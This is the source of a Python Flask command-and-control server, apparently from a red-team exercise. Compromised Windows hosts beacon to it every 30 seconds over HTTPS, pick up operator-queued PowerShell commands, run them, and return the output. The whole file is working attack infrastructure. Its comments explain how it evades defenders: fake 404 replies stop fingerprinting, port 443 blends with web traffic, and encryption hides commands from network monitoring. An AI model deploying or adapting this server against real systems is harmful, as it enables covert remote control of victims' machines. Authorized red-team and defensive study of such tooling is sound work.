# c2_server.py

# Command and Control (C2) server that runs on the Kali machine.
# Receives periodic HTTPS beacon check-ins from compromised Windows targets
# and allows the operator to issue PowerShell commands that get picked up
# on the next beacon interval (every 30 seconds).
#
# Architecture:
#   - Targets beacon in via POST /beacon on port 443 (HTTPS)
#   - Operator queues commands via POST /issue from a separate terminal
#   - On the next beacon the target receives the queued command, executes it,
#     and sends the result back on the following beacon
#
# Usage:
#   Start server:   sudo python3 c2_server.py
#   Issue command:  curl -sk -X POST https://localhost/issue \
#                     -H "Content-Type: application/json" \
#                     -d '{"id": "HOSTNAME", "cmd": "whoami"}'

from flask import Flask, request, jsonify
import ssl, hashlib, os

app = Flask(__name__)

# ── Shared secret for agent authentication ────────────────────────────────────
# The secret is hashed with SHA256 and the resulting hex digest is what agents
# must include in every request header as X-Agent-Token. This prevents
# unauthorized parties from issuing commands or registering fake agents.
# The same secret must be configured in payload.ps1 on the target side.
# Any request that does not include the correct token is rejected with a
# generic 404 response so blue team cannot fingerprint the server as a C2.
AGENT_SECRET = hashlib.sha256(b"foxtrot-redteam-2026").hexdigest()

# ── In-memory storage for commands and results ────────────────────────────────
# pending_commands maps agent hostname to a queued command string.
# When the operator issues a command it is stored here until the next
# beacon picks it up. Commands are removed after being sent once using
# dict.pop() so they do not get sent repeatedly.
pending_commands = {}   # agent_id -> command queue

# results stores the output history from each agent indexed by hostname.
# Each time an agent sends back command output it is appended to its list.
results = {}            # agent_id -> list of output strings

# ── Token verification helper ─────────────────────────────────────────────────
# Called at the start of every beacon request to validate the agent token.
# Reads the X-Agent-Token header from the incoming request and compares it
# to the expected AGENT_SECRET value. Returns True if they match, False otherwise.
def verify(req):
    return req.headers.get("X-Agent-Token") == AGENT_SECRET

# ── Beacon endpoint ───────────────────────────────────────────────────────────
# This is the endpoint that compromised Windows targets call every 30 seconds.
# Each beacon serves two purposes:
#   1. Delivering command output from the previous execution back to the operator
#   2. Picking up any new command the operator has queued for that agent
# The endpoint is POST only and requires a valid agent token in the header.
@app.route("/beacon", methods=["POST"])
def beacon():
    # Reject any request that does not include the correct agent token.
    # Returning 404 instead of 401 or 403 makes the server look like a
    # normal web server with a missing page rather than a C2 listening post.
    if not verify(request):
        return "Not Found", 404         # looks like a normal 404 to blue team
    data = request.json
    # The agent ID is the hostname of the compromised machine set in payload.ps1
    # as $env:COMPUTERNAME. This is how we distinguish between multiple targets
    # when running against more than one machine simultaneously.
    agent_id = data.get("id")
    print(f"[DEBUG] Beacon received from agent_id: '{agent_id}'")  # send agent id for debug

    # If the beacon includes a result field it means the agent executed a
    # command on the previous beacon cycle and is returning the output.
    # Store the result in history and print it to the operator terminal.
    if data.get("result"):
        results.setdefault(agent_id, []).append(data["result"])
        print(f"\n[{agent_id}] Result:\n{data['result']}")

    # Check if the operator has queued a command for this agent.
    # dict.pop() removes and returns the command in one operation so it
    # is only sent once. Returns None if no command is queued which tells
    # the agent to do nothing until the next beacon.
    cmd = pending_commands.pop(agent_id, None)
    print(f"[DEBUG] Sending command to {agent_id}: '{cmd}'")

    # Return the command (or None) as JSON. The agent checks this response
    # and executes the command if one is present.
    return jsonify({"cmd": cmd})

# ── Issue endpoint ────────────────────────────────────────────────────────────
# This endpoint is called by the operator from a separate terminal to queue
# a command for a specific agent. It is not called by the agents themselves.
# The operator specifies the target agent by hostname and provides the
# PowerShell command to execute. The command is stored in pending_commands
# and will be picked up by that agent on its next beacon check-in.
#
# Example usage from terminal:
#   curl -sk -X POST https://localhost/issue \
#     -H "Content-Type: application/json" \
#     -d '{"id": "CLOUDBASE-INIT0", "cmd": "whoami"}'
@app.route("/issue", methods=["POST"])
def issue():
    data = request.json
    # Store the command keyed by agent hostname. If a command was already
    # queued for this agent it will be overwritten by the new one.
    pending_commands[data["id"]] = data["cmd"]
    return jsonify({"status": "queued"})

# ── Server startup ────────────────────────────────────────────────────────────
# Starts the Flask server on all network interfaces (0.0.0.0) so it accepts
# connections from any network the Kali machine is connected to.
# Port 443 is used because it is the standard HTTPS port and blends in with
# normal encrypted web traffic making it less likely to be blocked by firewalls.
# ssl_context loads the self-signed certificate and private key generated by
# openssl during setup. This encrypts all beacon traffic so blue team cannot
# read commands or results even if they are sniffing the network.
# sudo is required to bind to port 443 since it is a privileged port below 1024.
#
# To generate the required certificate and key before starting:
#   openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 30 -nodes
if __name__ == "__main__":
    # Generate a self-signed cert first:
    # openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 30 -nodes
    app.run(host="0.0.0.0", port=443, ssl_context=("cert.pem", "key.pem"))